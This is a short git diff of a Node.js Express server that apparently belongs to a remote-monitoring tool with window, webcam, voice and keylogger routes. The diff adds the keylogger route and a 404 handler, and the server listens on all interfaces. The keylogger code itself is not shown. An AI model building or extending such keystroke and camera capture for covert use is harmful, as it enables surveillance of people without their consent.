@@ -4,6 +4,7 @@ const path = require('path');
 const window = require('./router/window')
 const webcam = require('./router/webcam')
 const voice = require('./router/voice')
+const keylogger = require('./router/keylogger')
 const main = require('./router/mine')
 const port = 3000;
 
@@ -28,11 +29,14 @@ app.get('/', (req, res) => {
 window(app,path)
 webcam(app,path)
 voice(app,path)
+keylogger(app,path)
 main(app,path)
-//app.use((req, res, next) => {
-  //res.status(404).sendFile(path.join(__dirname, './html', '404.html'));
-//});
-// 서버 시작
+
+app.use((req, res, next) => {
+  res.status(404).sendFile(path.join(__dirname, './html', '404.html'));
+});
+
+// start server
 const server = app.listen(port, '0.0.0.0', () => {
     const port = server.address().port;
     console.log(`Server is running on port ${port}`);
